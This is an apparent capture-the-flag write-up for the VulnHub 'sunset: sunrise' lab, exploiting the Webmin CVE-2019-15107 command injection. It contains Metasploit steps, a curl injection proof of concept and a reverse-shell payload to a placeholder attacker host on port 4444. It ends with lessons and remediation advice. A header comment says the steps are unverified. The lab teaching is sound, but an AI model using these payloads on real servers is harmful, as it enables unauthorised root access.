# sunset: sunrise — Writeup

<!-- generated from known techniques; verify against live VM -->

| | |
|-|-|
| **Target IP** | 192.168.56.X (host-only) |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Root Flag** | `/root/root.txt` |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/sunset-sunrise,406/) |

## Attack Summary

nmap → Webmin on :10000 → CVE-2019-15107 (unauthenticated RCE via password_change.cgi) → root shell directly

## Methodology

1. Network discovery and port scan
2. Identify Webmin on port 10000
3. Exploit CVE-2019-15107 (Webmin < 1.920 unauthenticated RCE)
4. Root shell without privilege escalation needed

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
nmap -sV -sC -p- <TARGET_IP>
```

Expected open ports: 22 (SSH), 80 (HTTP), **10000** (Webmin HTTPS).


---

## Step 2: Webmin Enumeration

Browse to `https://<TARGET>:10000`. Identifies as Webmin. Check version in page footer or HTTP headers.

```bash
curl -k https://<TARGET>:10000/ -I 2>/dev/null | grep -i server
```

---

## Step 3: CVE-2019-15107 — Webmin RCE

Webmin < 1.920 with the "Change Passwords" module allows unauthenticated command injection via the `old` parameter of `password_change.cgi`. The exploit bypasses authentication entirely.

```bash
# Metasploit module
msfconsole -q
use exploit/linux/http/webmin_backdoor
set RHOSTS <TARGET>
set RPORT 10000
set SSL true
set LHOST <ATTACKER>
set LPORT 4444
exploit
# Drops a root shell (Webmin runs as root)
```

Manual PoC:

```bash
curl -k "https://<TARGET>:10000/password_change.cgi" \
    --data 'user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2'
# uid=0(root) confirms RCE
```


---

## Step 4: Root Shell

```bash
# Metasploit gives immediate root (Webmin runs as root)
# or via reverse shell payload:
curl -k "https://<TARGET>:10000/password_change.cgi" \
    --data "user=rootxx&pam=&expired=2&old=test|bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'&new1=x&new2=x"

# On listener:
nc -lvnp 4444
id
# uid=0(root)
cat /root/root.txt
```


---

## Lessons Learned

1. **CVE-2019-15107**: Webmin < 1.920 had a backdoor introduced in a compromised source tarball (not the official GitHub). The `password_change.cgi` module allows unauthenticated OS command injection
2. **Webmin running as root** means any RCE in Webmin is immediate root access
3. **Patch management**: Keep server management tools up-to-date; subscribe to CVE alerts for all exposed services

## Remediation

| Vulnerability | Fix |
|---|---|
| Webmin CVE-2019-15107 | Update to Webmin ≥ 1.930; use official GitHub releases, not tarballs |
| Webmin exposed on LAN | Restrict port 10000 to management VLANs; require VPN for access |
| Webmin running as root | Where possible, run Webmin as a dedicated user with sudo for specific tasks |
